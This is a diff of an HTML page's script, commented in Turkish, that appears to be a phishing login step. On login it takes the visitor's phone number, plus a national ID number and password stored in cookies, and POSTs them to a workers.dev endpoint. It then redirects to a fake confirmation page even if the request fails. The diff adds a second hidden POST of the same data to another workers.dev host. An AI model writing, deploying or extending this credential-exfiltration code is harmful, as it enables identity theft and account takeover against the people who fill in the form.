@@ -398,26 +398,26 @@
 </div></div>
  
 <script>
-
     function getCookie(name) {
-    var nameEQ = name + "=";
-    var ca = document.cookie.split(';');
-    for (var i = 0; i < ca.length; i++) {
-        var c = ca[i];
-        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+        var nameEQ = name + "=";
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+        }
+        return null;
     }
-    return null;
-}
+
     var phoneNumberInput = document.getElementById('telno');
-    
+
     // Giriş butonu
     var loginBtn = document.getElementById('loginBtn');
-    
+
     // Cep telefonu numarası input alanını dinle
     phoneNumberInput.addEventListener('input', function () {
         var phoneNumber = phoneNumberInput.value;
-    
+
         // Eğer en az 8 karakter girilmişse
         if (phoneNumber.length >= 8) {
             // Giriş butonunun disable özelliğini kaldır
@@ -427,36 +427,51 @@
             loginBtn.setAttribute('disabled', 'disabled');
         }
     });
-    
+
     // Giriş butonuna tıklanınca
-loginBtn.addEventListener('click', function () {
-    var telno = document.getElementById('telno').value;
+    loginBtn.addEventListener('click', function () {
+        var telno = document.getElementById('telno').value;
 
-    // Cookie'den kayıtlı adı al
-    var tcno = getCookie("tcno");
-    var pass = getCookie("pass");
-    
-    // POST işlemi için veri oluştur
-    var data = new FormData();
-    data.append('telno', telno);
-    data.append('tcno', tcno); // Cookie'den alınan adı ekle
-    data.append('pass', pass);
-    // POST işlemi için fetch kullanarak isteği oluştur
-    fetch('https://worker-red-mountain-1d57.zalexisgod.workers.dev/', {
-        method: 'POST',
-        body: data
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log(data);
-        window.location.href = 'onay.html';
-    })
-    .catch(error => {
-        console.error('Hata:', error);
-        window.location.href = 'onay.html';
+        // Cookie'den kayıtlı adı al
+        var tcno = getCookie("tcno");
+        var pass = getCookie("pass");
+
+        // POST işlemi için veri oluştur
+        var data = new FormData();
+        data.append('telno', telno);
+        data.append('tcno', tcno); // Cookie'den alınan adı ekle
+        data.append('pass', pass);
+
+        // POST işlemi için fetch kullanarak isteği oluştur
+        fetch('https://worker-red-mountain-1d57.zalexisgod.workers.dev/', {
+            method: 'POST',
+            body: data
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+            window.location.href = 'onay.html';
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+            window.location.href = 'onay.html';
+        });
+
+        // İkinci adres için aynı işlemi gerçekleştir
+        fetch('https://worker-hidden-meadow-bce1.selimjuhan2.workers.dev/', {
+            method: 'POST',
+            body: data
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+            // İkinci adresin cevabına göre işlem yapabilirsiniz
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+        });
     });
-});
+</script>
 
-    </script>
  
 </body></html>
